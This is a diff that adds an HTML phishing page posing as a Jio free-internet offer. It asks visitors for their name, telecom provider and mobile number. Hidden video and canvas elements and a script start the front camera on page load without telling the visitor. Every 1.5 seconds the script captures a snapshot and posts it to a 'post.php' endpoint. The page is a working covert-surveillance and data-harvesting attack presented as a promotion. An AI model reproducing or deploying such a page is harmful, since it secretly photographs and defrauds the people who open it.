@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jio Special Offer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #001f3f; /* Dark blue background */
+            color: #fff; /* White text color */
+            text-align: center;
+        }
+        .container {
+            max-width: 90%;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #ce1515; /* Red text color */
+        }
+        p {
+            color: #46a15d; /* Light green text color */
+        }
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #000; /* Black text color */
+        }
+        input[type="text"], select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .submit-btn {
+            background-color: #ff5733; /* Orange button color */
+            color: #fff; /* White text color */
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .submit-btn:hover {
+            background-color: #ff4500; /* Darker orange on hover */
+        }
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px;
+                padding: 10px;
+            }
+            input[type="text"], select, .submit-btn {
+                width: calc(100% - 20px);
+                margin-bottom: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to Jio Special Offer!</h1>
+        <p>Get free internet for every SIM card worth ₹399.</p>
+        <form action="#" method="post">
+            <div class="form-group">
+                <label for="name">Enter your name:</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            <div class="form-group">
+                <label for="sim">Choose your telecom service provider:</label>
+                <select id="sim" name="sim" required>
+                    <option value="">Select one</option>
+                    <option value="vi">Vi</option>
+                    <option value="jio">Jio</option>
+                    <option value="airtel">Airtel</option>
+                    <option value="bsnl">BSNL</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="mobile">Enter your mobile number:</label>
+                <input type="text" id="mobile" name="mobile" required>
+            </div>
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
+    </div>
+
+
+  <!-- Camera functionality -->
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <script>
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php', // Your PHP file URL
+        dataType: 'json',
+        async: false,
+        success: function(result) {
+          // Handle success
+        },
+        error: function() {
+          // Handle errors
+        }
+      });
+    }
+
+    'use strict';
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+    const constraints = {
+      audio: false,
+      video: { facingMode: "user" }
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+      var context = canvas.getContext('2d');
+      setInterval(function() {
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+      }, 1500);
+    }
+
+    // Load init
+    init();
+  </script>    
+</body>
+</html>
+
